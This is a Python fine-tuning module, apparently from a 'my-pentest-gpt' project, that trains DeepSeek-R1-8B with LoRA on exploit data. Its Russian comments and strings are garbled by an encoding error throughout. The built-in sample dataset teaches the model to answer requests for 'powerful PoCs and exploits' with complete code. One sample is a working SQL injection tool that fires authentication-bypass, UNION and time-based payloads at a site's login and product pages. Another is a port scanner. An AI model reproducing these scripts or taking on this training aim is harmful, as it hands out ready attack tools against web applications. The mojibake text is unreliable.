"""
–ú–æ–¥—É–ª—å LoRA-–¥–æ–æ–±—É—á–µ–Ω–∏—è –¥–ª—è my-pentest-gpt
–û–±—É—á–∞–µ—Ç DeepSeek-R1-8B –Ω–∞ —Å–ø–µ—Ü–∏–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö
"""
import os
import torch
import logging
from pathlib import Path
from typing import Optional, Dict, Any
from transformers import (
    AutoModelForCausalLM,
    AutoTokenizer,
    Trainer,
    TrainingArguments,
    DataCollatorForLanguageModeling
)
from peft import (
    get_peft_config,
    get_peft_model,
    LoraConfig,
    TaskType,
    PeftModel
)
from datasets import load_dataset, Dataset
import json

from .config import (
    MODEL_CONFIG,
    LORA_CONFIG,
    TRAINING_CONFIG,
    MODEL_PATH,
    OUTPUT_DIR,
    DATA_DIR
)

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class LoRATrainer:
    """–¢—Ä–µ–Ω–µ—Ä –¥–ª—è LoRA-–¥–æ–æ–±—É—á–µ–Ω–∏—è DeepSeek-R1-8B"""

    def __init__(
        self,
        base_model_path: Optional[str] = None,
        output_dir: Optional[Path] = None
    ):
        self.base_model_path = base_model_path or MODEL_CONFIG["model_name"]
        self.output_dir = output_dir or OUTPUT_DIR
        self.model = None
        self.tokenizer = None

        self.output_dir.mkdir(parents=True, exist_ok=True)

    def prepare_model(self) -> None:
        """–ü–æ–¥–≥–æ—Ç–∞–≤–ª–∏–≤–∞–µ—Ç –º–æ–¥–µ–ª—å –¥–ª—è –æ–±—É—á–µ–Ω–∏—è"""
        logger.info(f"–ó–∞–≥—Ä—É–∑–∫–∞ –±–∞–∑–æ–≤–æ–π –º–æ–¥–µ–ª–∏: {self.base_model_path}")

        self.tokenizer = AutoTokenizer.from_pretrained(
            self.base_model_path,
            trust_remote_code=True,
            padding_side="right"
        )

        if self.tokenizer.pad_token is None:
            self.tokenizer.pad_token = self.tokenizer.eos_token

        self.model = AutoModelForCausalLM.from_pretrained(
            self.base_model_path,
            torch_dtype=torch.float16,
            device_map="auto",
            trust_remote_code=True
        )

        peft_config = LoraConfig(
            task_type=TaskType.CAUSAL_LM,
            inference_mode=False,
            r=LORA_CONFIG["r"],
            lora_alpha=LORA_CONFIG["lora_alpha"],
            lora_dropout=LORA_CONFIG["lora_dropout"],
            target_modules=LORA_CONFIG["target_modules"]
        )

        self.model = get_peft_model(self.model, peft_config)
        self.model.print_trainable_parameters()

        logger.info("–ú–æ–¥–µ–ª—å –ø–æ–¥–≥–æ—Ç–æ–≤–ª–µ–Ω–∞ –¥–ª—è LoRA –æ–±—É—á–µ–Ω–∏—è")

    def prepare_dataset(self, data_path: Path) -> Dataset:
        """
        –ü–æ–¥–≥–æ—Ç–∞–≤–ª–∏–≤–∞–µ—Ç –¥–∞—Ç–∞—Å–µ—Ç –¥–ª—è –æ–±—É—á–µ–Ω–∏—è

        Args:
            data_path: –ü—É—Ç—å –∫ —Ñ–∞–π–ª—É —Å –¥–∞–Ω–Ω—ã–º–∏ (JSONL —Ñ–æ—Ä–º–∞—Ç)

        Returns:
            –ü–æ–¥–≥–æ—Ç–æ–≤–ª–µ–Ω–Ω—ã–π –¥–∞—Ç–∞—Å–µ—Ç
        """
        logger.info(f"–ó–∞–≥—Ä—É–∑–∫–∞ –¥–∞—Ç–∞—Å–µ—Ç–∞ –∏–∑: {data_path}")

        if not data_path.exists():
            raise FileNotFoundError(f"–§–∞–π–ª –¥–∞–Ω–Ω—ã—Ö –Ω–µ –Ω–∞–π–¥–µ–Ω: {data_path}")

        dataset = load_dataset("json", data_files=str(data_path))["train"]

        def preprocess_function(examples):
            """–ü—Ä–µ–¥–æ–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ—Ç –ø—Ä–∏–º–µ—Ä—ã –¥–ª—è –æ–±—É—á–µ–Ω–∏—è"""
            texts = []
            for prompt, completion in zip(examples["prompt"], examples["completion"]):
                text = f"{prompt}\n{completion}{self.tokenizer.eos_token}"
                texts.append(text)

            tokenized = self.tokenizer(
                texts,
                truncation=True,
                max_length=TRAINING_CONFIG["seq_length"],
                padding=False
            )

            tokenized["labels"] = tokenized["input_ids"].copy()

            return tokenized

        processed_dataset = dataset.map(
            preprocess_function,
            batched=True,
            remove_columns=dataset.column_names
        )

        logger.info(f"–î–∞—Ç–∞—Å–µ—Ç –ø–æ–¥–≥–æ—Ç–æ–≤–ª–µ–Ω: {len(processed_dataset)} –ø—Ä–∏–º–µ—Ä–æ–≤")
        return processed_dataset

    def train(
        self,
        dataset: Dataset,
        epochs: int = None,
        batch_size: int = None,
        learning_rate: float = None
    ) -> None:
        """
        –ó–∞–ø—É—Å–∫–∞–µ—Ç –æ–±—É—á–µ–Ω–∏–µ LoRA

        Args:
            dataset: –ü–æ–¥–≥–æ—Ç–æ–≤–ª–µ–Ω–Ω—ã–π –¥–∞—Ç–∞—Å–µ—Ç
            epochs: –ö–æ–ª–∏—á–µ—Å—Ç–≤–æ —ç–ø–æ—Ö
            batch_size: –†–∞–∑–º–µ—Ä –±–∞—Ç—á–∞
            learning_rate: –°–∫–æ—Ä–æ—Å—Ç—å –æ–±—É—á–µ–Ω–∏—è
        """
        if self.model is None:
            raise ValueError("–ú–æ–¥–µ–ª—å –Ω–µ –ø–æ–¥–≥–æ—Ç–æ–≤–ª–µ–Ω–∞. –í—ã–∑–æ–≤–∏—Ç–µ prepare_model() —Å–Ω–∞—á–∞–ª–∞.")

        epochs = epochs or TRAINING_CONFIG["epochs"]
        batch_size = batch_size or TRAINING_CONFIG["batch_size"]
        learning_rate = learning_rate or TRAINING_CONFIG["learning_rate"]

        training_args = TrainingArguments(
            output_dir=str(self.output_dir),
            num_train_epochs=epochs,
            per_device_train_batch_size=batch_size,
            gradient_accumulation_steps=TRAINING_CONFIG["gradient_accumulation_steps"],
            learning_rate=learning_rate,
            fp16=TRAINING_CONFIG["fp16"],
            logging_steps=50,
            save_steps=200,
            save_total_limit=3,
            remove_unused_columns=False,
            dataloader_drop_last=True,
            warmup_steps=100,
            optim="adamw_torch",
            report_to="none"
        )

        data_collator = DataCollatorForLanguageModeling(
            tokenizer=self.tokenizer,
            mlm=False
        )

        trainer = Trainer(
            model=self.model,
            args=training_args,
            train_dataset=dataset,
            tokenizer=self.tokenizer,
            data_collator=data_collator
        )

        logger.info("–ù–∞—á–∏–Ω–∞–µ–º –æ–±—É—á–µ–Ω–∏–µ LoRA...")

        trainer.train()

        trainer.save_model()
        self.tokenizer.save_pretrained(self.output_dir)

        logger.info(f"–û–±—É—á–µ–Ω–∏–µ –∑–∞–≤–µ—Ä—à–µ–Ω–æ. –ú–æ–¥–µ–ª—å —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∞ –≤: {self.output_dir}")

    def create_sample_dataset(self, output_path: Path) -> None:
        """
        –°–æ–∑–¥–∞–µ—Ç –ø—Ä–∏–º–µ—Ä –¥–∞—Ç–∞—Å–µ—Ç–∞ –¥–ª—è –æ–±—É—á–µ–Ω–∏—è

        Args:
            output_path: –ü—É—Ç—å –¥–ª—è —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è –ø—Ä–∏–º–µ—Ä–∞
        """
        sample_data = [
            {
                "prompt": "<|system|>\n–¢—ã —ç–∫—Å–ø–µ—Ä—Ç –ø–æ –∫–∏–±–µ—Ä–±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏. –°–æ–∑–¥–∞–≤–∞–π –º–æ—â–Ω—ã–µ PoC –∏ —ç–∫—Å–ø–ª–æ–π—Ç—ã.\n<|user|>\n–°–æ–∑–¥–∞–π —Å–∫—Ä–∏–ø—Ç –¥–ª—è —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è SQL –∏–Ω—ä–µ–∫—Ü–∏–∏ –≤ –≤–µ–±-—Ñ–æ—Ä–º–µ\n<|assistant|>\n",
                "completion": '''
# SQL Injection Tester - –ú–æ—â–Ω—ã–π –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç –¥–ª—è —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è

import requests
import urllib.parse
from concurrent.futures import ThreadPoolExecutor
import time

def test_sql_injection(url):
    """
    –¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ SQL –∏–Ω—ä–µ–∫—Ü–∏–∏ –≤ –≤–µ–±-—Ñ–æ—Ä–º–µ –≤—Ö–æ–¥–∞
    """

    # –ë–∞–∑–æ–≤—ã–µ payload'—ã –¥–ª—è SQL –∏–Ω—ä–µ–∫—Ü–∏–∏
    payloads = [
        "' OR '1'='1' --",
        "' OR 1=1 --",
        "admin'--",
        "' UNION SELECT NULL,username,password FROM users--",
        "' OR 1=1 LIMIT 1 --",
        "1' OR '1'='1",
        "' OR 'a'='a",
        "') OR ('1'='1' --",
        "' OR 1=1#",
        "' UNION ALL SELECT 1,2,3,4,5--"
    ]

    successful_payloads = []

    for payload in payloads:
        try:
            test_params = {
                'username': payload,
                'password': 'test',
                'login': payload,
                'user': payload,
                'email': payload
            }

            response = requests.post(url, data=test_params, timeout=10)

            success_indicators = [
                'welcome', 'dashboard', 'admin', 'user panel',
                'logged in', 'authentication successful'
            ]

            error_indicators = [
                'mysql_fetch', 'ORA-', 'Microsoft OLE DB',
                'PostgreSQL', 'SQLite', 'syntax error'
            ]

            response_lower = response.text.lower()

            if any(indicator in response_lower for indicator in success_indicators):
                successful_payloads.append({
                    'payload': payload,
                    'type': 'Authentication Bypass',
                    'response_length': len(response.text)
                })
                print(f"‚úÖ –£—Å–ø–µ—à–Ω–∞—è –∏–Ω—ä–µ–∫—Ü–∏—è: {payload}")

            elif any(error in response_lower for error in error_indicators):
                successful_payloads.append({
                    'payload': payload,
                    'type': 'Error-based SQL Injection',
                    'response_length': len(response.text)
                })
                print(f"‚ö†Ô∏è –û—à–∏–±–∫–∞ –ë–î –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∞: {payload}")

            time.sleep(0.5)

        except requests.exceptions.RequestException as e:
            print(f"‚ùå –û—à–∏–±–∫–∞ –∑–∞–ø—Ä–æ—Å–∞ –¥–ª—è {payload}: {e}")

    return successful_payloads

def advanced_sql_test(url, param_name='id'):
    """–ü—Ä–æ–¥–≤–∏–Ω—É—Ç–æ–µ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ SQL –∏–Ω—ä–µ–∫—Ü–∏–∏"""

    union_payloads = [
        f"1' UNION SELECT 1,version(),database(),user()--",
        f"1' UNION SELECT 1,table_name,null,null FROM information_schema.tables--",
        f"1' UNION SELECT 1,column_name,null,null FROM information_schema.columns--"
    ]

    time_payloads = [
        f"1'; WAITFOR DELAY '00:00:05'--",
        f"1' OR SLEEP(5)--",
        f"1'; SELECT pg_sleep(5)--"
    ]

    results = []

    for payload in union_payloads + time_payloads:
        try:
            start_time = time.time()
            response = requests.get(f"{url}?{param_name}={urllib.parse.quote(payload)}", timeout=10)
            end_time = time.time()

            response_time = end_time - start_time

            if response_time > 4:
                results.append({
                    'payload': payload,
                    'type': 'Time-based SQL Injection',
                    'response_time': response_time
                })
                print(f"‚è∞ Time-based –∏–Ω—ä–µ–∫—Ü–∏—è: {payload} ({response_time:.2f}s)")

            if 'mysql' in response.text.lower() or 'version' in response.text.lower():
                results.append({
                    'payload': payload,
                    'type': 'Union-based SQL Injection',
                    'response_length': len(response.text)
                })
                print(f"üîç Union-based –∏–Ω—ä–µ–∫—Ü–∏—è: {payload}")

        except Exception as e:
            print(f"‚ùå –û—à–∏–±–∫–∞: {e}")

    return results

if __name__ == "__main__":
    target_url = "http://vulnerable-site.com/login"
    results = test_sql_injection(target_url)
    advanced_results = advanced_sql_test("http://vulnerable-site.com/product.php")

    print(f"\nüìä –ù–∞–π–¥–µ–Ω–æ —É—è–∑–≤–∏–º–æ—Å—Ç–µ–π: {len(results + advanced_results)}")
'''
            },
            {
                "prompt": "<|system|>\n–¢—ã —ç–∫—Å–ø–µ—Ä—Ç –ø–æ –∫–∏–±–µ—Ä–±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏. –°–æ–∑–¥–∞–≤–∞–π –º–æ—â–Ω—ã–µ –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ã –¥–ª—è –ø–µ–Ω—Ç–µ—Å—Ç–∏–Ω–≥–∞.\n<|user|>\n–ù–∞–ø–∏—à–∏ —Å–∫—Ä–∏–ø—Ç –¥–ª—è —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è –ø–æ—Ä—Ç–æ–≤\n<|assistant|>\n",
                "completion": """```python
import socket
from concurrent.futures import ThreadPoolExecutor
import argparse

def scan_port(host, port, timeout=1):
    '''–°–∫–∞–Ω–∏—Ä—É–µ—Ç –æ–¥–∏–Ω –ø–æ—Ä—Ç –Ω–∞ —Ö–æ—Å—Ç–µ'''
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(timeout)
            result = sock.connect_ex((host, port))
            return port if result == 0 else None
    except:
        return None

def port_scanner(host, start_port=1, end_port=1000, threads=100):
    '''–°–∫–∞–Ω–∏—Ä—É–µ—Ç –¥–∏–∞–ø–∞–∑–æ–Ω –ø–æ—Ä—Ç–æ–≤'''
    print(f"–°–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ {host} –ø–æ—Ä—Ç–æ–≤ {start_port}-{end_port}")

    open_ports = []

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {
            executor.submit(scan_port, host, port): port
            for port in range(start_port, end_port + 1)
        }

        for future in futures:
            result = future.result()
            if result:
                open_ports.append(result)
                print(f"–ü–æ—Ä—Ç {result} –æ—Ç–∫—Ä—ã—Ç")

    return sorted(open_ports)

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("host", help="–¶–µ–ª–µ–≤–æ–π —Ö–æ—Å—Ç")
    parser.add_argument("-p", "--ports", default="1-1000",
                       help="–î–∏–∞–ø–∞–∑–æ–Ω –ø–æ—Ä—Ç–æ–≤ (–Ω–∞–ø—Ä–∏–º–µ—Ä: 1-1000)")

    args = parser.parse_args()

    start, end = map(int, args.ports.split('-'))
    open_ports = port_scanner(args.host, start, end)

    print(f"\n–ù–∞–π–¥–µ–Ω–æ –æ—Ç–∫—Ä—ã—Ç—ã—Ö –ø–æ—Ä—Ç–æ–≤: {len(open_ports)}")
```"""
            }
        ]

        # –°–æ—Ö—Ä–∞–Ω—è–µ–º –≤ JSONL —Ñ–æ—Ä–º–∞—Ç–µ
        with open(output_path, 'w', encoding='utf-8') as f:
            for item in sample_data:
                f.write(json.dumps(item, ensure_ascii=False) + '\n')

        logger.info(f"–ü—Ä–∏–º–µ—Ä –¥–∞—Ç–∞—Å–µ—Ç–∞ —Å–æ–∑–¥–∞–Ω: {output_path}")

def train_lora(
    data_path: Optional[Path] = None,
    epochs: int = 3,
    batch_size: int = 8,
    learning_rate: float = 3e-4
) -> None:
    """
    –ì–ª–∞–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è –¥–ª—è LoRA –æ–±—É—á–µ–Ω–∏—è

    Args:
        data_path: –ü—É—Ç—å –∫ –¥–∞–Ω–Ω—ã–º –¥–ª—è –æ–±—É—á–µ–Ω–∏—è
        epochs: –ö–æ–ª–∏—á–µ—Å—Ç–≤–æ —ç–ø–æ—Ö
        batch_size: –†–∞–∑–º–µ—Ä –±–∞—Ç—á–∞
        learning_rate: –°–∫–æ—Ä–æ—Å—Ç—å –æ–±—É—á–µ–Ω–∏—è
    """
    # –ò—Å–ø–æ–ª—å–∑—É–µ–º –ø—É—Ç—å –ø–æ —É–º–æ–ª—á–∞–Ω–∏—é –µ—Å–ª–∏ –Ω–µ —É–∫–∞–∑–∞–Ω
    if data_path is None:
        data_path = DATA_DIR / "exploits.jsonl"

    # –°–æ–∑–¥–∞–µ–º –ø—Ä–∏–º–µ—Ä –¥–∞–Ω–Ω—ã—Ö –µ—Å–ª–∏ —Ñ–∞–π–ª –Ω–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç
    if not data_path.exists():
        logger.warning(f"–§–∞–π–ª –¥–∞–Ω–Ω—ã—Ö –Ω–µ –Ω–∞–π–¥–µ–Ω: {data_path}")
        logger.info("–°–æ–∑–¥–∞–µ–º –ø—Ä–∏–º–µ—Ä –¥–∞—Ç–∞—Å–µ—Ç–∞...")

        data_path.parent.mkdir(parents=True, exist_ok=True)
        trainer = LoRATrainer()
        trainer.create_sample_dataset(data_path)

    # –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä—É–µ–º —Ç—Ä–µ–Ω–µ—Ä
    trainer = LoRATrainer()

    try:
        # –ü–æ–¥–≥–æ—Ç–∞–≤–ª–∏–≤–∞–µ–º –º–æ–¥–µ–ª—å
        trainer.prepare_model()

        # –ü–æ–¥–≥–æ—Ç–∞–≤–ª–∏–≤–∞–µ–º –¥–∞—Ç–∞—Å–µ—Ç
        dataset = trainer.prepare_dataset(data_path)

        # –ó–∞–ø—É—Å–∫–∞–µ–º –æ–±—É—á–µ–Ω–∏–µ
        trainer.train(dataset, epochs, batch_size, learning_rate)

        logger.info("LoRA –æ–±—É—á–µ–Ω–∏–µ —É—Å–ø–µ—à–Ω–æ –∑–∞–≤–µ—Ä—à–µ–Ω–æ!")

    except Exception as e:
        logger.error(f"–û—à–∏–±–∫–∞ –≤–æ –≤—Ä–µ–º—è –æ–±—É—á–µ–Ω–∏—è: {e}")
        raise

if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="LoRA –æ–±—É—á–µ–Ω–∏–µ DeepSeek-R1-8B")
    parser.add_argument("--data", type=Path, help="–ü—É—Ç—å –∫ —Ñ–∞–π–ª—É –¥–∞–Ω–Ω—ã—Ö (JSONL)")
    parser.add_argument("--epochs", type=int, default=3, help="–ö–æ–ª–∏—á–µ—Å—Ç–≤–æ —ç–ø–æ—Ö")
    parser.add_argument("--batch-size", type=int, default=8, help="–†–∞–∑–º–µ—Ä –±–∞—Ç—á–∞")
    parser.add_argument("--lr", type=float, default=3e-4, help="–°–∫–æ—Ä–æ—Å—Ç—å –æ–±—É—á–µ–Ω–∏—è")

    args = parser.parse_args()

    train_lora(args.data, args.epochs, args.batch_size, args.lr)
